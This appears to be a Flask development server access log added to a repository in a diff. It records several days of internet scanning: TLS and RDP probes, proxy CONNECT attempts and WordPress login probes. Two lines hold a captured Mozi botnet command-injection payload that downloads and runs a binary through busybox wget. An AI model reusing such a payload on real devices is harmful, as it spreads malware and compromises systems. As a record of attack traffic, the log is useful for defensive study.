@@ -1,0 +1,648 @@
+ * Serving Flask app 'app'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:8081
+ * Running on http://62.68.147.97:8081
+Press CTRL+C to quit
+141.98.11.79 - - [03/May/2024 11:12:33] "CONNECT google.com:443 HTTP/1.1" 404 -
+206.168.32.3 - - [03/May/2024 11:27:09] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [03/May/2024 11:27:12] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [03/May/2024 11:27:12] code 505, message Invalid HTTP version (2.0)
+206.168.32.3 - - [03/May/2024 11:27:12] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+94.156.71.223 - - [03/May/2024 11:45:49] "CONNECT 45.61.137.126:7227 HTTP/1.1" 404 -
+205.210.31.36 - - [03/May/2024 12:03:26] code 400, message Bad request version ('À\x13À')
+205.210.31.36 - - [03/May/2024 12:03:26] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03;4*U\x8a3\x0d\x0f\x18\x0bR^BûÞS\x0b^\x9dÄ79ëUV»\x00?b-r« ÷¹btì\x06$çuþF 9÷tº7Î6­'\x98\x96½¬µ\x87GÑi\x90G\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+205.210.31.36 - - [03/May/2024 12:03:26] code 400, message Bad HTTP/0.9 request type ("\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03#¹Q\x03o¥\x7f®¯ÔÒD\x14\x8bVÅ\x14oÃ¾W8Ô\x80¹-\x11Ý\x08ôj=\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À")
+205.210.31.36 - - [03/May/2024 12:03:26] "\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03#¹Q\x03o¥\x7f®¯ÔÒD\x14\x8bVÅ\x14oÃ¾W8Ô\x80¹-\x11Ý\x08ôj=\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À" HTTPStatus.BAD_REQUEST -
+95.143.190.179 - - [03/May/2024 12:28:38] "GET / HTTP/1.1" 404 -
+95.143.190.179 - - [03/May/2024 12:30:07] "GET / HTTP/1.1" 404 -
+95.143.190.179 - - [03/May/2024 12:30:07] "GET /favicon.ico HTTP/1.1" 404 -
+206.168.32.3 - - [03/May/2024 13:10:26] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [03/May/2024 13:10:29] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [03/May/2024 13:10:29] code 505, message Invalid HTTP version (2.0)
+206.168.32.3 - - [03/May/2024 13:10:29] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+193.118.51.138 - - [03/May/2024 14:05:01] "GET / HTTP/1.1" 404 -
+185.180.143.6 - - [03/May/2024 18:01:31] "GET / HTTP/1.1" 404 -
+94.156.66.82 - - [03/May/2024 19:49:14] "CONNECT 185.65.245.140:7227 HTTP/1.1" 404 -
+193.29.13.175 - - [03/May/2024 20:04:15] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+193.29.13.175 - - [03/May/2024 20:04:15] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+206.217.128.98 - - [03/May/2024 20:10:41] "GET / HTTP/1.1" 404 -
+83.97.73.245 - - [03/May/2024 20:45:32] "GET /jars HTTP/1.1" 404 -
+193.29.13.175 - - [03/May/2024 21:24:16] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+193.29.13.175 - - [03/May/2024 21:24:16] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+206.168.32.3 - - [03/May/2024 22:12:25] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [03/May/2024 22:12:28] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [03/May/2024 22:12:28] code 505, message Invalid HTTP version (2.0)
+206.168.32.3 - - [03/May/2024 22:12:28] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+91.122.53.111 - - [03/May/2024 22:35:24] "GET / HTTP/1.1" 404 -
+80.76.49.105 - - [03/May/2024 22:56:13] "CONNECT 193.149.189.126:7227 HTTP/1.1" 404 -
+198.235.24.235 - - [04/May/2024 00:01:16] "GET / HTTP/1.1" 404 -
+205.210.31.54 - - [04/May/2024 01:00:16] "GET / HTTP/1.0" 404 -
+198.235.24.200 - - [04/May/2024 01:26:41] code 400, message Bad request version ('À\x13À')
+198.235.24.200 - - [04/May/2024 01:26:41] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03%\x19wW\x14J\x9c\x1a\x84\x10\x10¶qnÞ\x14á\x1a)k¬"^OÈ5\x7fÜx}\x86\x86 h¹8\x87Bc\x17|\x83\x81U\x86òA\x07\x0dic?ÖS\x97E\x8a\x92#Ýs\x7fö¨ú\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+198.235.24.200 - - [04/May/2024 01:26:41] code 400, message Bad HTTP/0.9 request type ("\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03»5æj'àö@6\x9f\x96¨]ÜÆVWui\x17\x8bÑ\x9b¿/O\x84\x93]¯x{\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À")
+198.235.24.200 - - [04/May/2024 01:26:41] "\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03»5æj'àö@6\x9f\x96¨]ÜÆVWui\x17\x8bÑ\x9b¿/O\x84\x93]¯x{\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À" HTTPStatus.BAD_REQUEST -
+91.122.53.111 - - [04/May/2024 02:38:19] "GET / HTTP/1.1" 404 -
+141.98.11.79 - - [04/May/2024 02:46:10] "CONNECT google.com:443 HTTP/1.1" 404 -
+216.218.206.69 - - [04/May/2024 03:18:21] code 400, message Bad request version ('À\x14À')
+216.218.206.69 - - [04/May/2024 03:18:21] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03á\x09Ìu'C\x84\x9a\x94\x8e_ä\x12«\x9bJ0Á9Ï\x90¹Áí\x16\x9a¿îøU\\Æ\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+83.97.73.245 - - [04/May/2024 05:27:24] "GET /jars HTTP/1.1" 404 -
+206.168.32.3 - - [04/May/2024 06:22:35] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [04/May/2024 06:22:39] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [04/May/2024 06:22:39] code 505, message Invalid HTTP version (2.0)
+206.168.32.3 - - [04/May/2024 06:22:39] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+184.105.139.78 - - [04/May/2024 07:35:36] "GET / HTTP/1.1" 404 -
+184.105.139.94 - - [04/May/2024 07:36:16] "GET /favicon.ico HTTP/1.1" 404 -
+184.105.139.98 - - [04/May/2024 07:36:40] "GET http://api.ipify.org/?format=json HTTP/1.1" 404 -
+184.105.139.94 - - [04/May/2024 07:37:03] "CONNECT www.shadowserver.org:443 HTTP/1.1" 404 -
+80.66.88.251 - - [04/May/2024 11:02:29] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00+&à\x00\x00\x00\x00\x00Cookie:')
+80.66.88.251 - - [04/May/2024 11:02:29] "\x03\x00\x00+&à\x00\x00\x00\x00\x00Cookie: mstshash=hello" HTTPStatus.BAD_REQUEST -
+80.76.49.130 - - [04/May/2024 11:09:07] "CONNECT 45.61.137.126:7227 HTTP/1.1" 404 -
+192.241.203.43 - - [04/May/2024 12:01:10] code 400, message Bad request syntax ('MGLNDD_62.68.147.97_8081')
+192.241.203.43 - - [04/May/2024 12:01:10] "MGLNDD_62.68.147.97_8081" HTTPStatus.BAD_REQUEST -
+206.168.32.3 - - [04/May/2024 12:29:07] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [04/May/2024 12:29:10] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [04/May/2024 12:29:11] code 505, message Invalid HTTP version (2.0)
+206.168.32.3 - - [04/May/2024 12:29:11] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+91.122.53.111 - - [04/May/2024 12:54:06] "GET /wp-login.php HTTP/1.1" 404 -
+185.167.96.138 - - [04/May/2024 16:29:38] code 400, message Bad request syntax ('\x16\x03\x01\x00u\x01\x00\x00q\x03\x03?%y`g35`>2í0.¹w\x83¯[}¬')
+185.167.96.138 - - [04/May/2024 16:29:38] "\x16\x03\x01\x00u\x01\x00\x00q\x03\x03?%y`g35`>2í0.¹w\x83¯[}¬" HTTPStatus.BAD_REQUEST -
+91.122.53.111 - - [04/May/2024 16:38:12] "GET /favicon.ico HTTP/1.1" 404 -
+185.180.140.6 - - [04/May/2024 17:40:47] "GET / HTTP/1.1" 404 -
+141.98.11.79 - - [04/May/2024 17:59:31] "CONNECT google.com:443 HTTP/1.1" 404 -
+206.168.32.3 - - [04/May/2024 21:08:02] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [04/May/2024 21:08:05] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [04/May/2024 21:08:06] code 505, message Invalid HTTP version (2.0)
+206.168.32.3 - - [04/May/2024 21:08:06] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+198.235.24.112 - - [04/May/2024 23:00:43] "GET / HTTP/1.0" 404 -
+87.236.176.173 - - [04/May/2024 23:29:20] "GET / HTTP/1.1" 404 -
+94.156.71.232 - - [04/May/2024 23:59:02] "CONNECT 193.149.189.126:7227 HTTP/1.1" 404 -
+186.148.245.61 - - [05/May/2024 02:07:47] code 400, message Bad HTTP/0.9 request type ("27%0A/bin/sh${IFS}-c${IFS}'cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}Mozi.7;${IFS}busybox${IFS}wget${IFS}http://%s:%d/Mozi.7;${IFS}chmod${IFS}777${IFS}Mozi.7;${IFS}./Mozi.7'%0A%27&loginUser=a&loginPwd=a")
+186.148.245.61 - - [05/May/2024 02:07:47] "27%0A/bin/sh${IFS}-c${IFS}'cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}Mozi.7;${IFS}busybox${IFS}wget${IFS}http://%s:%d/Mozi.7;${IFS}chmod${IFS}777${IFS}Mozi.7;${IFS}./Mozi.7'%0A%27&loginUser=a&loginPwd=a HTTP/1.0" HTTPStatus.BAD_REQUEST -
+206.168.32.3 - - [05/May/2024 05:13:14] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [05/May/2024 05:13:18] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [05/May/2024 05:13:18] code 505, message Invalid HTTP version (2.0)
+206.168.32.3 - - [05/May/2024 05:13:18] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+178.128.41.83 - - [05/May/2024 05:16:09] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x01û\x01\x00\x01÷\x03\x03¥\x99\x8f{ÆmÔr\x96}°¥R~\x15Ø»¨â\x90')
+178.128.41.83 - - [05/May/2024 05:16:09] "\x16\x03\x01\x01û\x01\x00\x01÷\x03\x03¥\x99\x8f{ÆmÔr\x96}°¥R~\x15Ø»¨â\x90\x09AHpÓöª\x1b\x046\x03^\x00\x01<Ì\x14Ì\x13Ì\x15À0À,À(À$À\x14À" HTTPStatus.BAD_REQUEST -
+91.122.53.111 - - [05/May/2024 05:34:08] "GET / HTTP/1.1" 404 -
+172.104.11.51 - - [05/May/2024 06:48:34] code 400, message Bad request version ('À\x14À')
+172.104.11.51 - - [05/May/2024 06:48:34] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03±\x1cÉå¡<ÅÍ\x13p\x8dD\x06©T\x8e\x93þs '\x84ÞûÚ­OºM \x10/\x00\x00 À/À0À+À,Ì¨Ì©À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+141.98.11.79 - - [05/May/2024 07:18:33] "CONNECT google.com:443 HTTP/1.1" 404 -
+45.132.194.4 - - [05/May/2024 07:46:56] "GET / HTTP/1.1" 404 -
+45.132.194.4 - - [05/May/2024 07:46:56] "GET / HTTP/1.1" 404 -
+45.132.194.4 - - [05/May/2024 07:46:57] "GET / HTTP/1.1" 404 -
+74.82.47.29 - - [05/May/2024 08:13:55] "GET / HTTP/1.1" 404 -
+74.82.47.13 - - [05/May/2024 08:14:41] "GET /favicon.ico HTTP/1.1" 404 -
+74.82.47.41 - - [05/May/2024 08:15:12] "GET http://api.ipify.org/?format=json HTTP/1.1" 404 -
+74.82.47.53 - - [05/May/2024 08:15:34] "CONNECT www.shadowserver.org:443 HTTP/1.1" 404 -
+198.235.24.13 - - [05/May/2024 08:15:43] code 400, message Bad request version ('À\x13À')
+198.235.24.13 - - [05/May/2024 08:15:43] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03¦EJ´J\x08q¯ûÁ"§0DßhçV\x9fÔ\x16h\x8eì\x16f\x85\x17\x02/c» ?\x14Ó\x97oÝ?ëúb\x90X«\x0bÒu\x07ídºÿgÏãêÄ/d\x80«OÀ\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+198.235.24.13 - - [05/May/2024 08:15:44] code 400, message Bad request version ('À(À$À\x14À')
+198.235.24.13 - - [05/May/2024 08:15:44] "\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03\x97)øGI\x0b\x8dÿÒÞæ\x8aßw' w½\x8cn}\x82o¦\x8a\x9b\x98ph;µw\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À" HTTPStatus.BAD_REQUEST -
+206.168.32.3 - - [05/May/2024 09:02:21] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [05/May/2024 09:02:25] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [05/May/2024 09:02:25] code 505, message Invalid HTTP version (2.0)
+206.168.32.3 - - [05/May/2024 09:02:25] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+65.49.1.32 - - [05/May/2024 09:32:02] code 400, message Bad request version ('À\x14À')
+65.49.1.32 - - [05/May/2024 09:32:02] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03i»±GÝð\x1ft\x07Å¼a\x12\x80\x8cËPkÄÌjg\x09(\x80,Äì\x09,)6\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+205.210.31.167 - - [05/May/2024 11:39:17] "GET / HTTP/1.1" 404 -
+94.156.66.81 - - [05/May/2024 11:40:24] "CONNECT 45.61.136.175:7227 HTTP/1.1" 404 -
+206.168.32.3 - - [05/May/2024 15:24:28] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [05/May/2024 15:24:32] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [05/May/2024 15:24:32] code 505, message Invalid HTTP version (2.0)
+206.168.32.3 - - [05/May/2024 15:24:32] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+91.92.251.254 - - [05/May/2024 18:44:14] "CONNECT 45.61.136.175:7227 HTTP/1.1" 404 -
+167.71.249.209 - - [05/May/2024 21:07:06] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x01,\x01\x00\x01(\x03\x03\x94·eÇÔX=áú\x90µA÷I¶ë¯|\x13å§\x04zo')
+167.71.249.209 - - [05/May/2024 21:07:06] "\x16\x03\x01\x01,\x01\x00\x01(\x03\x03\x94·eÇÔX=áú\x90µA÷I¶ë¯|\x13å§\x04zo\x0dIy¸É=\x15p\x00\x00ªÀ0À,À(À$À\x14À" HTTPStatus.BAD_REQUEST -
+167.71.249.209 - - [05/May/2024 21:08:44] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00¡\x01\x00\x00\x9d\x03\x03×´eS\x03híä\x81')
+167.71.249.209 - - [05/May/2024 21:08:44] "\x16\x03\x01\x00¡\x01\x00\x00\x9d\x03\x03×´eS\x03híä\x81\x1e·Ð\x8d]\x82g\x17À\x9cV¾\x97Q´ÿ¹\x8b\x90ì\x88\x12\x9f\x00\x00@À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ" HTTPStatus.BAD_REQUEST -
+95.214.27.7 - - [05/May/2024 21:12:28] "GET /config HTTP/1.1" 404 -
+103.232.54.31 - - [05/May/2024 21:21:13] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00')
+103.232.54.31 - - [05/May/2024 21:21:13] "\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00" HTTPStatus.BAD_REQUEST -
+107.170.232.15 - - [05/May/2024 22:09:08] code 400, message Bad request syntax ('MGLNDD_62.68.147.97_8081')
+107.170.232.15 - - [05/May/2024 22:09:08] "MGLNDD_62.68.147.97_8081" HTTPStatus.BAD_REQUEST -
+141.98.11.79 - - [05/May/2024 23:44:04] "CONNECT google.com:443 HTTP/1.1" 404 -
+159.203.192.45 - - [05/May/2024 23:46:27] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [06/May/2024 00:00:09] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [06/May/2024 00:00:12] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [06/May/2024 00:00:12] code 505, message Invalid HTTP version (2.0)
+206.168.32.3 - - [06/May/2024 00:00:12] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+205.210.31.240 - - [06/May/2024 00:47:31] "GET / HTTP/1.0" 404 -
+162.216.113.158 - - [06/May/2024 00:47:46] "GET / HTTP/1.1" 404 -
+162.216.113.158 - - [06/May/2024 00:47:46] code 400, message Bad request version ("\x9e/H\x93y¥þÍY1i\x16wty\x00V\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00\x9f\x00\x9eÌªÀ¯À\xadÀ®À¬À$À(À#À'À")
+162.216.113.158 - - [06/May/2024 00:47:46] "\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03ix\x02ù¾x]öù\x95È1á2£ï\x8fÛ8\x8f\x9a9ô\x95e|W)³/Û¶ qxt(áç¾xF\x18V\x98Öá\x863\x1f\x9e/H\x93y¥þÍY1i\x16wty\x00V\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00\x9f\x00\x9eÌªÀ¯À­À®À¬À$À(À#À'À" HTTPStatus.BAD_REQUEST -
+24.152.49.138 - - [06/May/2024 02:01:13] code 400, message Bad HTTP/0.9 request type ("27%0A/bin/sh${IFS}-c${IFS}'cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}Mozi.7;${IFS}busybox${IFS}wget${IFS}http://%s:%d/Mozi.7;${IFS}chmod${IFS}777${IFS}Mozi.7;${IFS}./Mozi.7'%0A%27&loginUser=a&loginPwd=a")
+24.152.49.138 - - [06/May/2024 02:01:13] "27%0A/bin/sh${IFS}-c${IFS}'cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}Mozi.7;${IFS}busybox${IFS}wget${IFS}http://%s:%d/Mozi.7;${IFS}chmod${IFS}777${IFS}Mozi.7;${IFS}./Mozi.7'%0A%27&loginUser=a&loginPwd=a HTTP/1.0" HTTPStatus.BAD_REQUEST -
+198.235.24.202 - - [06/May/2024 05:29:48] "GET / HTTP/1.1" 404 -
+172.105.128.11 - - [06/May/2024 06:56:56] code 400, message Bad request version ('À\x14À')
+172.105.128.11 - - [06/May/2024 06:56:56] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\x1b÷\x90E²çEö\x1a,Ó²ì´\x92++ÆtÇ\x98Ã\x05»ò\x02%iMX\x82\x94\x00\x00 À/À0À+À,Ì¨Ì©À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+45.88.90.152 - - [06/May/2024 07:41:08] "CONNECT 193.149.189.126:7227 HTTP/1.1" 404 -
+ * Serving Flask app 'app'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:8081
+ * Running on http://62.68.147.97:8081
+Press CTRL+C to quit
+91.122.53.111 - - [07/May/2024 13:01:08] "GET /model/sweethomealabama2 HTTP/1.1" 200 -
+91.122.53.111 - - [07/May/2024 13:02:49] "GET /model/sweethomealabama2 HTTP/1.1" 200 -
+93.185.167.176 - - [07/May/2024 13:46:01] "CONNECT 45.61.137.126:7227 HTTP/1.1" 404 -
+64.62.156.113 - - [07/May/2024 14:37:07] "GET / HTTP/1.1" 404 -
+64.62.156.112 - - [07/May/2024 14:37:26] "GET /favicon.ico HTTP/1.1" 404 -
+64.62.156.111 - - [07/May/2024 14:37:32] "GET http://api.ipify.org/?format=json HTTP/1.1" 404 -
+64.62.156.118 - - [07/May/2024 14:37:35] "CONNECT www.shadowserver.org:443 HTTP/1.1" 404 -
+198.235.24.171 - - [07/May/2024 15:16:12] "GET / HTTP/1.1" 404 -
+198.235.24.72 - - [07/May/2024 15:46:42] "GET / HTTP/1.0" 404 -
+45.88.90.52 - - [07/May/2024 15:51:39] "CONNECT 185.65.245.140:7227 HTTP/1.1" 404 -
+87.121.69.52 - - [07/May/2024 17:02:47] "CONNECT google.com:443 HTTP/1.1" 404 -
+94.156.8.84 - - [07/May/2024 17:49:20] "CONNECT 193.149.189.126:7227 HTTP/1.1" 404 -
+206.168.32.3 - - [07/May/2024 18:38:01] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [07/May/2024 18:38:04] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [07/May/2024 18:38:05] code 505, message Invalid HTTP version (2.0)
+206.168.32.3 - - [07/May/2024 18:38:05] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+113.30.150.23 - - [07/May/2024 19:41:44] code 400, message Bad request version ('À\x14À')
+113.30.150.23 - - [07/May/2024 19:41:44] "\x16\x03\x01\x00u\x01\x00\x00q\x03\x03\x8bÝTX\x1eQ½È\x8dje\x13¦2`Vþ;Ú;<\x0d\x90î"\x83y§ÂÇ­m\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+87.236.176.214 - - [07/May/2024 19:50:08] "GET / HTTP/1.1" 404 -
+80.76.49.131 - - [07/May/2024 20:23:29] "CONNECT 193.149.189.126:7227 HTTP/1.1" 404 -
+141.98.11.79 - - [07/May/2024 21:19:44] "CONNECT google.com:443 HTTP/1.1" 404 -
+87.121.69.52 - - [07/May/2024 23:11:45] "CONNECT google.com:443 HTTP/1.1" 404 -
+167.94.146.57 - - [07/May/2024 23:42:24] "GET / HTTP/1.1" 404 -
+167.94.146.57 - - [07/May/2024 23:42:27] "GET / HTTP/1.1" 404 -
+167.94.146.57 - - [07/May/2024 23:42:27] code 505, message Invalid HTTP version (2.0)
+167.94.146.57 - - [07/May/2024 23:42:27] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+198.235.24.246 - - [08/May/2024 01:04:06] code 400, message Bad request version ('À\x13À')
+198.235.24.246 - - [08/May/2024 01:04:06] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03V\x08â9çö©4O\x87\x86¿¬Äª©\x954\\\x11Õ\x03D\x1eH\x83`Éfö\x9a\x9c »'\x0e-z(ë*\x1aÆÎ=Æ&9?}ËÃb\x88\x88W4Aò\x88.ÉýÑÄ\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+198.235.24.246 - - [08/May/2024 01:04:06] code 400, message Bad request syntax ('\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03qtw\x16\x16·\x95ó\x86}\x04Ï+Û\x12\x12\x8c(\x94\x11\x0e')
+198.235.24.246 - - [08/May/2024 01:04:06] "\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03qtw\x16\x16·\x95ó\x86}\x04Ï+Û\x12\x12\x8c(\x94\x11\x0e" HTTPStatus.BAD_REQUEST -
+185.224.128.17 - - [08/May/2024 02:27:17] "CONNECT example.com:80 HTTP/1.1" 404 -
+185.224.128.17 - - [08/May/2024 02:27:32] code 400, message Bad request syntax ('\x05\x01\x00')
+185.224.128.17 - - [08/May/2024 02:27:32] "\x05\x01\x00" HTTPStatus.BAD_REQUEST -
+185.224.128.17 - - [08/May/2024 02:27:32] code 400, message Bad request syntax ('\x04\x01\x00P\x00\x00\x00\x01\x00example.com\x00')
+185.224.128.17 - - [08/May/2024 02:27:32] "\x04\x01\x00P\x00\x00\x00\x01\x00example.com\x00" HTTPStatus.BAD_REQUEST -
+83.97.73.245 - - [08/May/2024 03:57:18] "GET /jars HTTP/1.1" 404 -
+184.105.247.227 - - [08/May/2024 04:00:07] "GET / HTTP/1.1" 404 -
+184.105.247.199 - - [08/May/2024 04:00:40] "GET /favicon.ico HTTP/1.1" 404 -
+184.105.247.195 - - [08/May/2024 04:01:04] "GET http://api.ipify.org/?format=json HTTP/1.1" 404 -
+184.105.247.203 - - [08/May/2024 04:01:26] "CONNECT www.shadowserver.org:443 HTTP/1.1" 404 -
+87.121.69.52 - - [08/May/2024 05:02:54] "CONNECT google.com:443 HTTP/1.1" 404 -
+95.214.27.7 - - [08/May/2024 05:07:35] "GET /config HTTP/1.1" 404 -
+167.94.138.37 - - [08/May/2024 06:31:52] "GET / HTTP/1.1" 404 -
+167.94.138.37 - - [08/May/2024 06:31:55] "GET / HTTP/1.1" 404 -
+167.94.138.37 - - [08/May/2024 06:31:55] code 505, message Invalid HTTP version (2.0)
+167.94.138.37 - - [08/May/2024 06:31:55] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+161.35.161.113 - - [08/May/2024 06:36:23] code 400, message Bad request version ('zy\x8e\x0e°\x94\\fÐ]ô\x00\x01<Ì\x14Ì\x13Ì\x15À0À,À(À$À\x14À')
+161.35.161.113 - - [08/May/2024 06:36:23] "\x16\x03\x01\x01û\x01\x00\x01÷\x03\x03Ñ\x9e\x90QÆ/\x98+à.(Æ Ðo h?p;\x1ezy\x8e\x0e°\x94\\fÐ]ô\x00\x01<Ì\x14Ì\x13Ì\x15À0À,À(À$À\x14À" HTTPStatus.BAD_REQUEST -
+206.168.32.3 - - [08/May/2024 06:38:48] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [08/May/2024 06:38:51] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [08/May/2024 06:38:52] code 505, message Invalid HTTP version (2.0)
+206.168.32.3 - - [08/May/2024 06:38:52] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+216.218.206.68 - - [08/May/2024 06:54:18] code 400, message Bad request version ('À\x14À')
+216.218.206.68 - - [08/May/2024 06:54:18] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03Ð\x9aÝbÊMZ\x9f\x9e\x1f\x871ç\x0e~Ê\x09ê÷\\§\x8aÂ]tX\x01Òú\x84Î\x80\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+80.76.49.105 - - [08/May/2024 07:40:00] "CONNECT 45.61.136.175:7227 HTTP/1.1" 404 -
+87.121.69.52 - - [08/May/2024 11:10:48] "CONNECT google.com:443 HTTP/1.1" 404 -
+141.98.11.79 - - [08/May/2024 12:54:32] "CONNECT google.com:443 HTTP/1.1" 404 -
+91.122.53.111 - - [08/May/2024 12:54:52] "OPTIONS /reply HTTP/1.1" 200 -
+91.122.53.111 - - [08/May/2024 12:55:27] "POST /reply HTTP/1.1" 200 -
+91.122.53.111 - - [08/May/2024 12:56:06] "OPTIONS /reply HTTP/1.1" 200 -
+91.122.53.111 - - [08/May/2024 12:56:10] "POST /reply HTTP/1.1" 200 -
+83.97.73.245 - - [08/May/2024 13:04:09] "GET /jars HTTP/1.1" 404 -
+198.235.24.229 - - [08/May/2024 13:22:53] "GET / HTTP/1.1" 404 -
+198.235.24.238 - - [08/May/2024 13:38:36] "GET / HTTP/1.0" 404 -
+159.89.170.26 - - [08/May/2024 14:27:24] "GET / HTTP/1.1" 404 -
+159.89.170.26 - - [08/May/2024 14:27:24] "GET /login HTTP/1.1" 404 -
+178.215.236.152 - - [08/May/2024 15:40:06] "CONNECT 45.61.136.175:7227 HTTP/1.1" 404 -
+178.215.236.52 - - [08/May/2024 15:40:28] "CONNECT 45.61.136.175:7227 HTTP/1.1" 404 -
+45.92.176.144 - - [08/May/2024 16:03:19] "GET / HTTP/1.1" 404 -
+87.121.69.52 - - [08/May/2024 17:24:13] "CONNECT google.com:443 HTTP/1.1" 404 -
+91.122.53.111 - - [08/May/2024 19:20:25] "GET / HTTP/1.1" 404 -
+185.216.71.4 - - [08/May/2024 19:47:23] "CONNECT pro.ip-api.com:443 HTTP/1.1" 404 -
